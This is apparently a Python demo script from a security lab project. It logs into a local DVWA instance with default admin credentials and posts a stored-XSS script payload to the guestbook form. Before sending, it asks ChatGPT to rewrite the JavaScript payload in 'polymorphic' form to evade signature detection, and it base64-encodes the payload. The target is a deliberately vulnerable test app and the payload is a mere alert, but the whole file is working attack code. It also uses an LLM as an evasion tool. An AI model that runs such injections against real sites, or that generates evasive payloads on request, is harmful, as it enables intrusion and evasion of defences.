import requests
import sys
import os
from base64 import b64encode, b64decode

current_dir = os.path.dirname(os.path.abspath(__file__))
class_dir = os.path.join(current_dir, "..", "class")
sys.path.append(class_dir)

from dvwa_session import DVWA_Session
from chatgpt_func import ChatGPT_Func
from general_func import General_Func

class PointlessAI_advanced_evasion_techniques(DVWA_Session, ChatGPT_Func, General_Func):
    def __init__(self):
        DVWA_Session.__init__(self)
        ChatGPT_Func.__init__(self)
        General_Func.__init__(self)

    def encode_payload(self, payload):
        # Encode payload to base64 to avoid signature detection
        encoded_payload = b64encode(payload.encode()).decode()
        return encoded_payload

    def decode_payload(self, encoded_payload):
        # Decode payload from base64
        decoded_payload = b64decode(encoded_payload.encode()).decode()
        return decoded_payload

    def polymorphic_code_generator(self, payload):
        # Use ChatGPT to suggest variations of the initial payload
        guidance = f"Generate a polymorphic version of this JS code to evade signature detection. {self.no_markdown}"
        polymorphic_payload = self.red_team_query(payload, guidance)
        print(payload)
        print("Polymorphic payload: \n")
        print(polymorphic_payload)
        return polymorphic_payload

    def exploit_dvwa(self, s, url, payload):
        # This method would exploit DVWA by sending the crafted payload, demonstrating evasion capabilities.
        encoded_payload = self.encode_payload(payload)
        print(encoded_payload)
        decoded_payload = self.decode_payload(encoded_payload)
        print(decoded_payload)

        url = "http://127.0.0.1/vulnerabilities/xss_s/"
        xss_data = {
            'txtName': 'Thankyou for your session id',
            'mtxMessage': decoded_payload,
            'btnSign': 'Sign+Guestbook'
        }
        response = s.post(url, data=xss_data)
        return response.text

    def run_advanced_evasion_techniques_demo(self):
        # A demo function to tie the techniques together and perform an attack against DVWA
        with requests.Session() as s:
            user_token, cookies = self.get_csrf_token_and_cookie(s, self.get_constants())
            _ = self.login_to_dvwa(s, self.get_constants(), "admin", "password", user_token)
            
            # Demonstrating polymorphic code generation and sandbox evasion
            original_payload = "<script>alert('Session ID is 123456')</script>"
            polymorphic_payload = self.polymorphic_code_generator(original_payload) # Returns polymorphic payload
            
            # Exploit the DVWA with the advanced evasion techniques applied to the payload
            result = self.exploit_dvwa(s, self.sql_injection, polymorphic_payload)
            return result

def main():
    ai_advanced = PointlessAI_advanced_evasion_techniques() # Instantiate class
    result = ai_advanced.run_advanced_evasion_techniques_demo()
    print(result)

if __name__ == "__main__":
    main()
